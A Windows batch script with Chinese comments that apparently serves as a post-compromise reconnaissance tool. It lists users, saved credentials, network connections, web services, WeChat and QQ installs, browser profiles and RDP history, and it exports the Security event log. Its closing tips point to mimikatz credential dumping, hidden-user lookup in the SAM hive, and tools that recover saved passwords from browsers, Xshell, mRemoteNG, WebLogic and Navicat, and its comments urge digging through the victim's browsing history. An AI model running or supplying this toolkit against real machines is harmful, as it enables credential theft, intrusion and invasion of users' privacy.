@ECHO OFF
TITLE windows-info v0.2
::by kid
echo -------------------------机器名-------------------------
hostname
echo -------------------------用户信息-------------------------
net user
echo -------------------------在线用户-------------------------
query user
echo -------------------------保存的凭据-------------------------
cmdkey /list
echo -------------------------正在连接的IP-------------------------
netstat -ano |findstr ESTABLISHED|findstr /v 127.0.0.1
echo -------------------------正在监听的端口-------------------------
netstat -ano |findstr LISTENING
echo -------------------------Web应用信息-------------------------
tasklist |findstr /i "http phpstudy nginx w3wp"
echo 查看应用路径 wmic process where name="phpstudy.exe" get processid,executablepath,name
echo -------------------------社交相关信息-------------------------
reg query "HKCU\SOFTWARE\Tencent" |findstr Tencent
echo -------------------------(*^▽^*)-------------------------
reg query "HKCU\SOFTWARE\Tencent" |find /i "tencent"|find /i "WeChat">nul 2>nul&&reg query "HKCU\SOFTWARE\Tencent\WeChat" |findstr Path||echo 没找到微信啊~
reg query "HKCU\SOFTWARE\Tencent" |find /i "tencent"|find /i "QQ">nul 2>nul&& reg query "HKCU\SOFTWARE\Tencent\QQ" |findstr Path ||echo 没找到QQ啊~ 
reg query "HKCU\SOFTWARE\Tencent" |find /i "tencent"|find /i "WXWORK">nul 2>nul&&reg query "HKCU\SOFTWARE\Tencent\WXWORK" |findstr Path ||echo 没找到企业微信啊~ 
echo -------------------------浏览器记录-------------------------
if exist "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\" (
	echo "找到chrome目录，快去扒他的浏览记录。"
) else (
	echo "未找到chrome目录"
)
if exist "C:\Users\%username%\AppData\Roaming\SogouExplorer\" (
	echo "找到搜狗浏览器目录，快去扒他的浏览记录。"
) else (
	echo "未找到搜狗浏览器目录"
)
if exist "C:\Users\%username%\AppData\Roaming\Mozilla\Firefox\Profiles" (
	echo "找到火狐浏览器目录，快去扒他的浏览记录。"
) else (
	echo "未找到火狐浏览器目录"
)
if exist "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Default" (
	echo "找到EDGE浏览器目录，快去扒他的浏览记录。"
) else (
	echo "未找到EDGE浏览器目录"
)
echo -------------------------RDP日志-------------------------
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s
echo -------------------------尝试备份安全日志到当前目录-------------------------
wevtutil epl Security %USERPROFILE%\desktop\Sec.evtx
echo -------------------------尝试获取远程登录日志-------------------------
wevtutil qe Security "/q:*[System [(EventID=4648)]]" /f:text /rd:true /c:10
echo -------------------------其他·提示-------------------------
echo 查询隐藏用户：HKEY_LOCAL_MACHINE --SAM–SAM(需要右击权限修改管理员权限)-Domains-Account-users
echo 查询密码信息：mimikatz privilege::debug sekurlsa::logonpasswords
echo 记得查浏览器密码
echo https://github.com/dzxs/Xdecrypt shell密码还原
echo https://github.com/haseebT/mRemoteNG-Decrypt mRemoteNG密码还原
echo https://github.com/NetSPI/WebLogicPasswordDecryptor WebLogic密码还原
echo https://github.com/p0z/CPD Chrome密码还原
echo Navicat密码还原
echo 不同版本windows可能存在差异，如注册表、文件保存位置
PAUSE
